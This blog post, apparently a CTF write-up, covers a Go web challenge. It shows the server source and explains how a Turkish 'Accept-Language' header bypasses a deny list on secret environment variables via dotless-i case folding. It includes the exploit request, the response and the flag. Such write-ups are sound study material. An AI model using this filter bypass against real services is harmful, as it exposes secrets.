---
layout: post
title:  "Strin-GO-Matic"
date:   2025-11-16 22:54:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /platypwn-strin-go-matic/
---

**Title**: Strin-GO-Matic

**Category**: Web

**Description**: It took me quite a while to decide whether I should name this challenge `“Strin-Go-Matic”`, `“strinGOmatic”`, or rather `“[Strin(g]-o)-Matic”`. Luckily, I had a tool for those case conversions at hand…

I get the challenge files. Here is `main.go`:
```shell
package main  
  
import (  
       _ "embed"  
       "encoding/json"  
       "fmt"  
       "io"  
       "log"  
       "net/http"  
       "os"  
       "regexp"  
       "strings"  
  
       "golang.org/x/text/cases"  
       "golang.org/x/text/language"  
       "golang.org/x/text/search"  
)  
  
//go:embed index.html  
var html string  
  
type Command struct {  
       Operation string `json:"operation"`  
       Input     string `json:"input"`  
       Args      string `json:"args"`  
}  
  
var envVarPattern = regexp.MustCompile(`^\$[A-Za-z0-9_]+$`)  
  
var forbiddenSubstrings = []string{  
       "kubernetes",  
       "strin_go_matic",  
}  
  
func main() {  
       flag, ok := os.LookupEnv("STRIN_GO_MATIC_FLAG")  
       if !ok || flag == "" {  
               log.Fatalf("required environment variable STRIN_GO_MATIC_FLAG is not set")  
       }  
  
       http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {  
               if r.Method != "GET" {  
                       invalid(w, http.StatusMethodNotAllowed, "Invalid method")  
                       return  
               }  
  
               fmt.Fprint(w, html)  
       })  
  
       http.HandleFunc("/go", func(w http.ResponseWriter, r *http.Request) {  
               if r.Method != "POST" {  
                       invalid(w, http.StatusMethodNotAllowed, "Invalid method")  
                       return  
               }  
  
               if r.Header.Get("Content-Type") != "application/json" {  
                       invalid(w, http.StatusBadRequest, "Could not find json payload")  
                       return  
               }  
  
               defer r.Body.Close()  
               payload, err := io.ReadAll(r.Body)  
               if err != nil {  
                       invalid(w, http.StatusBadRequest, "Could not read json payload")  
                       return  
               }  
  
               var command Command  
               if json.Unmarshal(payload, &command) != nil {  
                       invalid(w, http.StatusBadRequest, "Could not parse json payload")  
                       return  
               }  
  
               var tag language.Tag  
  
               acceptedLocales := strings.Split(r.Header.Get("Accept-Language"), ",")  
               for _, option := range acceptedLocales {  
                       if strings.Contains(option, ";") {  
                               option = strings.Split(option, ";")[0]  
                       }  
  
                       var err error  
                       tag, err = language.Parse(option)  
                       if err == nil {  
                               continue  
                       }  
               }  
  
               if tag == (language.Tag{}) {  
                       tag = language.AmericanEnglish  
               }  
  
               upper := cases.Upper(tag)  
               lower := cases.Lower(tag)  
               title := cases.Title(tag)  
  
               matcher := search.New(tag)  
  
               var result string  
  
               switch command.Operation {  
               case "upper":  
                       result = upper.String(command.Input)  
               case "lower":  
                       result = lower.String(command.Input)  
               case "title":  
                       result = title.String(command.Input)  
               case "equal":  
                       result = yesNo(matcher.EqualString(command.Input, command.Args))  
               case "contains":  
                       start, end := matcher.IndexString(command.Input, command.Args)  
                       result = yesNo(!(start == -1 && end == -1))  
               case "interpolate":  
                       words := strings.Split(command.Input, " ")  
                       for i, word := range words {  
                               if envVarPattern.MatchString(word) {  
                                       varName := lower.String(word[1:])  
                                       for _, substring := range forbiddenSubstrings {  
                                               if start, end := matcher.IndexString(varName, substring); start != -1 && end != -1 {  
                                                       invalid(w, http.StatusForbidden, "Forbidden variable")  
                                                       return  
                                               }  
                                       }  
  
                                       varValue, ok := os.LookupEnv(word[1:])  
                                       if !ok {  
                                               varValue = "{VARIABLE NOT SET}"  
                                       }  
  
                                       words[i] = varValue  
                               }  
                       }  
                       result = strings.Join(words, " ")  
               default:  
                       invalid(w, http.StatusBadRequest, "Unknown operation")  
                       return  
               }  
  
               w.Header().Set("Content-Type", "text/plain; charset=utf-8")  
               fmt.Fprint(w, result)  
       })  
  
       addr := "0.0.0.0:9000"  
       log.Printf("Server starting on %s\n", addr)  
       if err := http.ListenAndServe(addr, nil); err != nil {  
               log.Fatalf("server failed: %v", err)  
       }  
  
}  
  
func invalid(w http.ResponseWriter, statusCode int, message string) {  
       w.Header().Set("Content-Type", "text/plain")  
       w.WriteHeader(statusCode)  
       fmt.Fprint(w, message)  
}  
  
func yesNo(b bool) string {  
       if b {  
               return "Yes"  
       } else {  
               return "No"  
       }  
}
```

On these lines I see the server parses the `Accept-Language` header which I can control:
```go
acceptedLocales := strings.Split(r.Header.Get("Accept-Language"), ",")  
for _, option := range acceptedLocales {  
	if strings.Contains(option, ";") {  
		option = strings.Split(option, ";")[0]  
	}  
  
    var err error  
    tag, err = language.Parse(option)  
    if err == nil {  
			continue  
    }  
}  
```

The server also has 2 forbidden substrings:
```go
var forbiddenSubstrings = []string{
    "kubernetes",
    "strin_go_matic",
}
```

So `strin_go_matic` is blocked but it is exactly what needs to pass. I see on these lines the flag is stored as an environment variable called `STRIN_GO_MATIC_FLAG`:
```go
flag, ok := os.LookupEnv("STRIN_GO_MATIC_FLAG")  
if !ok || flag == "" {  
```

By changing the header from `Accept-Language: en-US,en;q=0.5` to `Accept-Language: tr-TR,tr;q=0.5` the letter `i` becomes useful. In Turkish the letter  `i` lowercases and uppercases differently than English:
- `"I".lower(tr) > "ı"` (dotless i)
- `"i".upper(tr) > "İ"` (capital i with dot)

Send this request:
```http
POST /go HTTP/1.1
Host: 10.80.12.213:9000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: tr-TR,tr;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.80.12.213:9000/
Content-Type: application/json
Content-Length: 79
Origin: http://10.80.12.213:9000
DNT: 1
Connection: keep-alive
Priority: u=0

{
"operation": "interpolate",
"input": "$STRIN_GO_MATIC_FLAG",
"args": ""
}
```

Response:
```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Sat, 15 Nov 2025 22:33:14 GMT
Content-Length: 52

PP{h0w_m4ny_d1ff3r3nt_i_m4y_th3r3_b3?::9pHUvuhZ2x9d}
```

Otherwise the server always responds with this:
```http
HTTP/1.1 403 Forbidden
Content-Type: text/plain
Date: Sat, 15 Nov 2025 22:34:02 GMT
Content-Length: 18

Forbidden variable
```

`PP{h0w_m4ny_d1ff3r3nt_i_m4y_th3r3_b3?::9pHUvuhZ2x9d}`